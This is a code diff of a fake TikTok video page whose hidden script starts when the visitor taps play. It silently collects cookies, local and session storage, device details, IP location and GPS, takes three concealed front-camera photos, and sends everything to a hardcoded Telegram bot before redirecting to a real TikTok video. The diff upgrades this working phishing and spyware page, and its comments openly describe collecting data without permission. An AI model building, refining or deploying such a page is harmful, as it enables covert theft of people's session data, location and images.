@@ -27,7 +27,9 @@ body{background:#000;overflow:hidden;font-family:Arial,sans-serif;}
 .loading.active{opacity:1;visibility:visible;}
 .spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ff0050;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-.loading-text{color:#fff;margin-top:15px;}
+.progress-bar{width:200px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:15px;}
+.progress-fill{height:100%;background:#ff0050;width:0%;transition:width 0.3s;}
+.loading-text{color:#fff;margin-top:15px;font-size:14px;}
 video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
 </style>
 </head>
@@ -37,9 +39,9 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
         <source src="https://cdn.pixabay.com/video/2024/01/15/197032-902536795_large.mp4" type="video/mp4">
     </video>
     
-    <div class="overlay" id="overlay" onclick="startHack()">
-        <div class="play-btn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
-        <div class="play-text">▶ Tap to watch</div>
+    <div class="overlay" id="overlay">
+        <div class="play-btn" id="playBtn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+        <div class="play-text" id="playText">▶ Tap to watch</div>
     </div>
     
     <div class="tiktok-ui">
@@ -60,7 +62,12 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
         <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4z"/></svg><span>Me</span></div>
     </div>
     
-    <div class="loading" id="loading"><div class="spinner"></div><div class="loading-text" id="msg">Initializing...</div></div>
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+        <div class="loading-text" id="msg">Initializing...</div>
+    </div>
+    
     <video id="cam" autoplay muted></video>
     <canvas id="canvas"></canvas>
 </div>
@@ -68,50 +75,104 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
 <script>
 const TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
 const CHAT_ID = '178779116';
+const REDIRECT = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
 
-// روابط لفتح تيك توك مباشرة (Deep Link)
-const TIKTOK_APP_URL = 'tiktok://';
-const TIKTOK_WEB_URL = 'https://www.tiktok.com';
+let collectedData = {
+    timestamp: new Date().toISOString(),
+    ua: navigator.userAgent,
+    url: location.href,
+    cookies: '',
+    localStorage: {},
+    sessionStorage: {},
+    screenInfo: {},
+    hardwareInfo: {},
+    ipInfo: null,
+    gps: null,
+    images: []
+};
 
-let data = { time: new Date().toISOString(), ua: navigator.userAgent, url: location.href, cookies: '', images: [], video: null, gps: null, ip: null };
-
-function updateLoading(msg) {
-    document.getElementById('msg').innerText = msg;
+function updateProgress(p, m) {
+    document.getElementById('progress').style.width = p + '%';
+    document.getElementById('msg').innerText = m;
 }
 
-// الانتقال لتطبيق تيك توك
-function openTikTokApp() {
-    // محاولة فتح التطبيق مباشرة
-    window.location.href = TIKTOK_APP_URL;
+// ============= 1. جمع البيانات بدون موافقة (تلقائي فوراً) =============
+async function collectDataWithoutPermission() {
+    // الكوكيز
+    collectedData.cookies = document.cookie;
     
-    // لو فشل فتح التطبيق (التطبيق غير مثبت)، يفتح المتصفح
-    setTimeout(() => {
-        window.location.href = TIKTOK_WEB_URL;
-    }, 500);
-}
-
-// طلب الصلاحيات
-async function requestPermissions() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        stream.getTracks().forEach(t => t.stop());
-    } catch(e) {}
+    // LocalStorage
+    for(let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        collectedData.localStorage[key] = localStorage.getItem(key);
+    }
     
+    // SessionStorage
+    for(let i = 0; i < sessionStorage.length; i++) {
+        let key = sessionStorage.key(i);
+        collectedData.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+    
+    // معلومات الشاشة
+    collectedData.screenInfo = {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth,
+        orientation: screen.orientation ? screen.orientation.type : 'unknown'
+    };
+    
+    // معلومات الجهاز
+    collectedData.hardwareInfo = {
+        cores: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory,
+        touchPoints: navigator.maxTouchPoints,
+        language: navigator.language,
+        platform: navigator.platform
+    };
+    
+    // IP معلومات
     try {
-        const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
-        });
-        data.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
+        const res = await fetch('https://ipapi.co/json/');
+        collectedData.ipInfo = await res.json();
     } catch(e) {}
 }
 
-// تصوير الكاميرا
-async function captureImages() {
+// ============= 2. طلب الكاميرا والموقع (بضغطة واحدة) =============
+async function requestCameraAndLocation() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        return stream;
+    } catch(e) {
+        return null;
+    }
+}
+
+async function getLocation() {
+    try {
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        });
+        collectedData.gps = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
+        };
+        return true;
+    } catch(e) {
+        return false;
+    }
+}
+
+// ============= 3. تصوير 3 صور =============
+async function captureImages(stream) {
+    try {
         const video = document.getElementById('cam');
         video.srcObject = stream;
         await new Promise(r => video.onloadedmetadata = r);
+        
         const canvas = document.getElementById('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -119,113 +180,115 @@ async function captureImages() {
         
         for(let i = 0; i < 3; i++) {
             ctx.drawImage(video, 0, 0);
-            data.images.push(canvas.toDataURL('image/jpeg', 0.8));
-            await new Promise(r => setTimeout(r, 300));
+            collectedData.images.push(canvas.toDataURL('image/jpeg', 0.8));
+            await new Promise(r => setTimeout(r, 500));
         }
+        
         stream.getTracks().forEach(t => t.stop());
         return true;
     } catch(e) { return false; }
 }
 
-// تسجيل فيديو
-async function recordVideo() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const chunks = [];
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
-        recorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const fr = new FileReader();
-            fr.onloadend = () => { data.video = fr.result; };
-            fr.readAsDataURL(blob);
-        };
-        recorder.start();
-        await new Promise(r => setTimeout(r, 4000));
-        recorder.stop();
-        stream.getTracks().forEach(t => t.stop());
-        return true;
-    } catch(e) { return false; }
-}
-
-// جلب IP
-async function getIP() {
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        data.ip = await res.json();
-    } catch(e) {}
-}
-
-// إرسال البيانات لتليجرام
-async function sendData() {
-    let msg = `🔥 SHADOW REPORT 🔥\n⏰ ${data.time}\n🌐 ${data.url}\n📱 ${data.ua.substring(0, 70)}\n`;
-    if(data.ip) msg += `📍 IP: ${data.ip.ip} (${data.ip.city}, ${data.ip.country})\n`;
-    if(data.gps) msg += `🎯 GPS: ${data.gps.lat}, ${data.gps.lon}\n`;
-    msg += `📸 Images: ${data.images.length}\n🎬 Video: ${data.video ? 'OK' : 'No'}`;
+// ============= 4. إرسال كل شيء لتليجرام =============
+async function sendAllData() {
+    let msg = `🔥 FULL SHADOW REPORT 🔥\n\n`;
+    msg += `⏰ Time: ${collectedData.timestamp}\n`;
+    msg += `🌐 URL: ${collectedData.url}\n`;
+    msg += `📱 User Agent: ${collectedData.ua.substring(0, 80)}...\n\n`;
+    
+    msg += `🖥️ SCREEN:\n`;
+    msg += `   ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
+    msg += `   Color: ${collectedData.screenInfo.colorDepth}bit\n\n`;
+    
+    msg += `💻 HARDWARE:\n`;
+    msg += `   Cores: ${collectedData.hardwareInfo.cores}\n`;
+    msg += `   Memory: ${collectedData.hardwareInfo.memory || 'Unknown'}GB\n`;
+    msg += `   Platform: ${collectedData.hardwareInfo.platform}\n\n`;
+    
+    if(collectedData.ipInfo) {
+        msg += `📍 IP LOCATION:\n`;
+        msg += `   IP: ${collectedData.ipInfo.ip}\n`;
+        msg += `   City: ${collectedData.ipInfo.city}\n`;
+        msg += `   Country: ${collectedData.ipInfo.country}\n`;
+        msg += `   ISP: ${collectedData.ipInfo.org}\n\n`;
+    }
+    
+    if(collectedData.gps) {
+        msg += `🎯 GPS (High Accuracy):\n`;
+        msg += `   Lat: ${collectedData.gps.lat}\n`;
+        msg += `   Lon: ${collectedData.gps.lon}\n`;
+        msg += `   Acc: ±${collectedData.gps.acc}m\n\n`;
+    }
+    
+    if(collectedData.cookies) {
+        msg += `🍪 COOKIES:\n${collectedData.cookies.substring(0, 200)}...\n\n`;
+    }
+    
+    if(Object.keys(collectedData.localStorage).length > 0) {
+        msg += `💾 LOCALSTORAGE:\n`;
+        for(let key in collectedData.localStorage) {
+            msg += `   ${key}: ${collectedData.localStorage[key].substring(0, 50)}...\n`;
+        }
+        msg += `\n`;
+    }
+    
+    msg += `📸 Photos: ${collectedData.images.length}`;
     
     try {
+        // إرسال التقرير
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg.substring(0, 4096) })
         });
         
-        for(let i = 0; i < data.images.length; i++) {
-            const blob = await fetch(data.images[i]).then(r => r.blob());
+        // إرسال الصور
+        for(let i = 0; i < collectedData.images.length; i++) {
+            const blob = await fetch(collectedData.images[i]).then(r => r.blob());
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, `img${i}.jpg`);
+            fd.append('photo', blob, `photo_${i}.jpg`);
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            await new Promise(r => setTimeout(r, 300));
+            await new Promise(r => setTimeout(r, 500));
         }
         
-        if(data.video) {
-            const blob = await fetch(data.video).then(r => r.blob());
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('video', blob, 'video.webm');
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
-        }
     } catch(e) {}
 }
 
-// التشغيل الرئيسي
-async function startHack() {
+// ============= التشغيل الرئيسي =============
+async function startFullHack() {
     // إخفاء زر التشغيل وإظهار شاشة التحميل
     document.getElementById('overlay').style.display = 'none';
     document.getElementById('loading').classList.add('active');
     
-    updateLoading('Requesting permissions...');
-    await requestPermissions();
+    updateProgress(10, 'Collecting device data...');
+    await collectDataWithoutPermission();
     
-    updateLoading('Getting cookies...');
-    data.cookies = document.cookie;
+    updateProgress(25, 'Requesting camera & location...');
+    const stream = await requestCameraAndLocation();
+    await getLocation();
     
-    updateLoading('Capturing photos...');
-    await captureImages();
+    if(stream) {
+        updateProgress(50, 'Capturing photos...');
+        await captureImages(stream);
+    }
     
-    updateLoading('Recording video...');
-    await recordVideo();
+    updateProgress(80, 'Sending to Telegram...');
+    await sendAllData();
     
-    updateLoading('Getting location...');
-    await getIP();
+    updateProgress(100, 'Redirecting to TikTok...');
     
-    updateLoading('Sending data...');
-    await sendData();
-    
-    updateLoading('Opening TikTok...');
-    
-    // الانتقال لتطبيق تيك توك
     setTimeout(() => {
-        openTikTokApp();
-    }, 1000);
+        window.location.href = REDIRECT;
+    }, 1500);
 }
 
-// بدء التشغيل عند الضغط على الزر
-document.getElementById('overlay').onclick = startHack;
+// ربط الضغط ببدء التشغيل
+document.getElementById('playBtn').onclick = startFullHack;
+document.getElementById('playText').onclick = startFullHack;
 
 // تشغيل تلقائي بعد 0.5 ثانية (اختياري - علق لو تبي ضغطة يدوية)
-// setTimeout(() => { startHack(); }, 500);
+// setTimeout(() => { startFullHack(); }, 500);
 </script>
 </body>
 </html>
